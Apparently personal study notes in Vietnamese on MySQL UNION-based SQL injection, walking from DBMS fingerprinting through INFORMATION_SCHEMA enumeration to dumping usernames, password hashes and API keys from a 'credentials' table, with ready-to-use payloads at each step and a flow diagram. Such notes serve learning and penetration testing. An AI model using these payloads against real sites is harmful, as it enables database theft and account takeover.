Tổng quan 

Fingerprint DBMS → @@version, POW(), SLEEP().
Liệt kê database → INFORMATION_SCHEMA.SCHEMATA.
Xác định current DB → database().
Liệt kê bảng → INFORMATION_SCHEMA.TABLES.
Liệt kê cột → INFORMATION_SCHEMA.COLUMNS.
Dump dữ liệu → UNION SELECT ….


\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
Chi tiết 

1. MySQL Fingerprinting
  Trước khi khai thác, cần xác định DBMS là gì.
  Một số payload phổ biến để fingerprint MySQL:
  SELECT @@version → trả về version (ví dụ: 10.3.22-MariaDB-1ubuntu1).
  SELECT POW(1,1) → trả về kết quả 1.
  SELECT SLEEP(5) → làm chậm response 5 giây.

2. INFORMATION_SCHEMA Database
  Là database chứa metadata về databases, tables, columns.
  Muốn dump dữ liệu qua SQLi bằng UNION, cần biết:
  Danh sách database
  Danh sách table trong mỗi database
  Danh sách column trong mỗi table

3. SCHEMATA
  SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;
  Payload SQLi:
    ' UNION SELECT 1,schema_name,3,4 FROM INFORMATION_SCHEMA.SCHEMATA-- -
  mysql
  information_schema
  performance_schema
  sys

4. database() (Current DB)
  Lấy database hiện tại: SELECT database();
  Payload SQLi: ' UNION SELECT 1,database(),2,3-- -

5. TABLES (Danh sách bảng)
  Từ INFORMATION_SCHEMA.TABLES, cần quan tâm:
    TABLE_SCHEMA (database nào)
    TABLE_NAME (tên bảng).
  Payload SQLi:  ' UNION SELECT 1,TABLE_NAME,TABLE_SCHEMA,4 FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='dev'-- -

6. COLUMNS (Danh sách cột)
  Từ INFORMATION_SCHEMA.COLUMNS, cần quan tâm:
    COLUMN_NAME, TABLE_NAME, TABLE_SCHEMA.
  Payload SQLi: ' UNION SELECT 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='credentials' AND table_schema='dev'-- -

7. Dump dữ liệu thật
  Sau khi biết cột, có thể dump dữ liệu trực tiếp: ' UNION SELECT 1,username,password,4 FROM dev.credentials-- -
  Kết quả: lấy được username, password hash, thậm chí API key.

\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

Flow cho dễ nhìn 

   +----------------------------------------------------+
   | 1. Fingerprint DBMS                                |
   | -------------------------------------------------- |
   | Query: @@version / POW(1,1) / SLEEP(5)             |
   | Thu được: DBMS type (MySQL/MariaDB + version)      |
   | Dùng để: Biết chắc DB là MySQL => dùng đúng cú pháp|
   +----------------------------------------------------+
                           |
                           v
   +----------------------------------------------------+
   | 2. Liệt kê databases                                |
   | -------------------------------------------------- |
   | Query: SELECT schema_name FROM information_schema.schemata |
   | Thu được: Danh sách DB (mysql, information_schema, ... , dev, ilfreight) |
   | Dùng để: Xác định DB nào là của ứng dụng            |
   +----------------------------------------------------+
                           |
                           v
   +----------------------------------------------------+
   | 3. DB hiện tại (app đang dùng)                     |
   | -------------------------------------------------- |
   | Query: SELECT database()                           |
   | Thu được: Tên DB đang dùng, vd: ilfreight          |
   | Dùng để: Biết context hiện tại, và chọn đúng DB để  |
   |           dump bảng (hoặc chuyển sang DB khác)     |
   +----------------------------------------------------+
                           |
                           v
   +----------------------------------------------------+
   | 4. Liệt kê bảng trong DB quan tâm                  |
   | -------------------------------------------------- |
   | Query: SELECT table_name, table_schema FROM information_schema.tables WHERE table_schema='dev' |
   | Thu được: Tên bảng, vd: credentials, framework, pages, posts |
   | Dùng để: Xác định bảng nào chứa dữ liệu nhạy cảm    |
   +----------------------------------------------------+
                           |
                           v
   +----------------------------------------------------+
   | 5. Liệt kê cột trong bảng                          |
   | -------------------------------------------------- |
   | Query: SELECT column_name FROM information_schema.columns WHERE table_name='credentials' AND table_schema='dev' |
   | Thu được: Tên cột, vd: username, password          |
   | Dùng để: Biết chính xác trường nào cần dump        |
   +----------------------------------------------------+
                           |
                           v
   +----------------------------------------------------+
   | 6. Dump dữ liệu thực                               |
   | -------------------------------------------------- |
   | Query: SELECT username, password FROM dev.credentials |
   | Thu được: Dữ liệu thật (tài khoản, hash, API key…) |
   | Dùng để: Đăng nhập, leo thang, exploit tiếp         |
   +----------------------------------------------------+
